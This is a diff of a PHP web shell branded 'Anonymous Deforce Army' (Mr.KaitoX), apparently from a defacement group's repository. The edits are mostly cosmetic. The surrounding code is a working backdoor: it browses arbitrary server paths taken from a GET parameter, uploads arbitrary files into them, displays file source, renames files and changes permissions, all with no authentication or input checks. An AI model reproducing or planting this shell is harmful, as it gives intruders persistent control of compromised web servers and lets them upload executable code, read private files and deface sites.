@@ -12,7 +12,6 @@ echo '<!DOCTYPE HTML>
 <head>
 <link rel="shortcut icon" href="https://i.imgur.com/bWgfa6Z.jpg" type="image/jpg"> 
 <body bgcolor="black"><center>
-	
 <link href="" rel="stylesheet" type="text/json_decode">
 <title>~[ Anonymous Deforce Army ]~</title>
 <style>
@@ -51,7 +50,7 @@ border-radius:5px;
 <body>
      <center><br><br>
     	<img border="0" src="https://i.imgur.com/bWgfa6Z.jpg" width="240" height="240">
-      </center>
+    </center>
     <h3><font color="white" Mr.KaitoX | Anonymous Deforce Army </h3></font.
     <div class="greetings">
         * ANONYMOUS DEFORCE ARMY *
@@ -70,13 +69,14 @@ border-radius:5px;
  | <a href="http://www.gitlab.com/MrKaitoX">Gitlab</a> | ~
     </div>
 <br>
-	
-	
-<table width="770" border="4" cellpadding="3" align="center">
-<font color="white">Path :</font> ';
+
+
+<table width="770" border="4" cellpadding="3" align="center">';
+
+echo '<tr><td><font color="white">Path : </font>';
 if(isset($_GET['path'])){
-$path = $_GET['path'];
-}else{
+$path = $_GET['path'];}
+else{
 $path = getcwd();
 }
 $path = str_replace('\\','/',$path);
@@ -96,9 +96,6 @@ if($i != $id) echo "/";
 echo '">'.$pat.'</a>/';
 }
 
-
-
-echo '<tr><td>';
 if(isset($_FILES['file'])){
 if(copy($_FILES['file']['tmp_name'],$path.'/'.$_FILES['file']['name'])){
 echo '<font color="cyan">Upload Success</font><br />';
@@ -111,8 +108,9 @@ echo '<form enctype="multipart/form-data" method="POST">
 <input type="submit" value="upload" />
 </form>
 
-
 </td></tr>';
+
+
 if(isset($_GET['filesrc'])){
 echo "<tr><td>Current File : ";
 echo $_GET['filesrc'];
@@ -140,9 +138,9 @@ Permission : <input name="perm" type="text" size="4" value="'.substr(sprintf('%o
 }elseif($_POST['opt'] == 'ganti nama'){
 if(isset($_POST['newname'])){
 if(rename($_POST['path'],$path.'/'.$_POST['newname'])){
-echo '<font color="">success name copy :v</font><br/>';
+echo '<font color="">Success Name copy :v</font><br/>';
 }else{
-echo '<font color="red">Not :<</font><br />';
+echo '<font color="red">Failed copy :<</font><br />';
 }
 $_POST['name'] = $_POST['newname'];
 }
@@ -263,9 +261,11 @@ echo '</center></td>
 echo '</table>
 </div>';
 }
-echo '<center><br/><size="6"Anonymous Deforce Army since 2018</center>
+echo '<center><br/><size="6"Anonymous Deforce Army (C) 2018</center>
 </body>
 </html>';
+
+
 function perms($file){
 $perms = fileperms($file);
 
